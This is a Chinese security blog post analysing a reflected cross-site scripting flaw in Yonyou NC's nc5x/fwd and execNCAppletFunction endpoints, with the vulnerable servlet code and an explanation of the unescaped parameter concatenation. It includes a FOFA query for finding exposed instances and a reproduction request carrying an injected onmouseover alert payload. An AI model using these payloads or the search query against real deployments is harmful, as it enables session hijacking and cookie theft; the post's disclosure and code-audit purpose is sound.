---
title: "用友NC nc5x/fwd、execNCAppletFunction 跨站脚本（XSS）漏洞"
source: https://mrxn.net/jswz/yonyou-nc5x-xss.html
asset_dir: assets/用友nc-nc5xfwd、execncappletfunction-跨站脚本（xss）漏洞
---

# 用友NC nc5x/fwd、execNCAppletFunction 跨站脚本（XSS）漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/5 10:26
- 654浏览
- [0评论](#comment)
- 30分钟阅读

深入探索

安全工具开发

JSON处理工具

恶意软件分析工具

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用友公司推出的一款企业管理[软件](#)，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC nc5x/fwd 接口存在跨站[脚本](#)（[XSS](https://mrxn.net/tag/xss)）漏洞。该漏洞源于`fwd`方法直接将`funcode`和`systemcode`参数的值拼接到HTML代码中，并作为`openNCNode`函数的参数，而没有进行充分的输入验证和过滤。攻击者可以通过构造包含恶意JavaScript代码的`funcode`或`systemcode`参数，例如`"><script>alert('XSS')</script>`，当用户访问包含恶意参数的URL时，恶意脚本会在用户的浏览器中执行。该漏洞可能导致攻击者劫持用户的会话、窃取用户的敏感信息（如Cookie），或者在用户的浏览器中执行任意JavaScript代码，从而进行恶意操作，例如篡改页面内容、重定向用户到恶意网站等。

脚本语言

# 影响版本

# fofa语法

> app="用友-UFIDA-NC"
>
> 漏洞预警服务

# 漏洞分析

## fwd

直接看代码

```
@Servlet(
    path = "/nc5x"
)
public class NC5xNodeIntAction extends BaseAction {
    @Action
    public void fwd(@Param(name = "funcode") String funcode, @Param(name = "systemcode") String systemcode) {
        String globalPath = LfwRuntimeEnvironment.getRootPath();
        String openNodeScriptUrl = globalPath + "/html/frame/nc5xNode.js";
        this.print("<html><head>");
        this.print("<script src='" + openNodeScriptUrl + "'></script>");
        this.print("<script src='/lfw/frame/script/basic/BrowserSniffer.js'></script>");
        this.print("<script>");
        this.print("if(IS_IE && !IS_IE9){window.$ = document.getElementById;}else{function $(id) {\treturn document.getElementById(id);\t}}");
        this.print("window.globalPath = '" + globalPath + "';");
        this.print("</script>");
        this.print("</head>");
        this.print("<body onload=\"openNCNode('" + funcode + "','" + systemcode + "');\"></body>");
        this.print("<html>");
    }
```

`this.print("<body onload=\"openNCNode('" + funcode + "','" + systemcode + "');\"></body>");` 这一行，从外部请求中获取的 `funcode` 和 `systemcode` 变量被直接使用 `+` 进行字符串拼接，嵌入到 `onload` 事件处理器的 JavaScript 代码中。`onload` 中的内容 `openNCNode('...', '...')` 是一个 JavaScript 函数调用，其参数由单引号包裹。攻击者可以通过精心构造的输入，闭合前面的单引号和函数调用，然后注入恶意的 JavaScript [脚本](#)。

软件

## execNCAppletFunction

```
@Action
public void execNCAppletFunction() {
    String param = this.request.getParameter("param");
    String globalPath = LfwRuntimeEnvironment.getRootPath();
    String openNodeScriptUrl = globalPath + "/html/frame/nc5xNode.js";
    this.print("<html><head>");
    this.print("<script src='" + openNodeScriptUrl + "'></script>");
    this.print("<script src='/lfw/frame/script/basic/BrowserSniffer.js'></script>");
    this.print("<script>");
    this.print("if(IS_IE && !IS_IE9){window.$ = document.getElementById;}else{function $(id) {\treturn document.getElementById(id);\t}}");
    this.print("window.globalPath = '" + globalPath + "';");
    this.print("</script>");
    this.print("</head>");
    this.print("<body onload=\"execNCAppletFunction('nc.client.portal.PortalInNCClient', 'openMsgPanel', 'notice;" + param + "', 'nc57');\"></body>");
    this.print("<html>");
}
```

# 漏洞复现

```
GET /portal/pt/nc5x/fwd?pageId=login&funcode=1%27);%22%20onmouseover=%22alert(`xss`)%22%20x=%22&systemcode=1111 HTTP/1.1
Host: nc.mrxn.net
```

[![用友NC nc5x/fwd、execNCAppletFunction 跨站脚本（XSS）漏洞](images/img-001-e0aff4e8e10d.webp)](https://image.mrxn.net/60874e8baff84a8084653d415d2d14ce.webp)

两个参数一样的问题

网络安全

- 标签：
- [#XSS](https://mrxn.net/tag/XSS)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.fwd](#toc-4-1-)
- [4.2.execNCAppletFunction](#toc-4-2-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
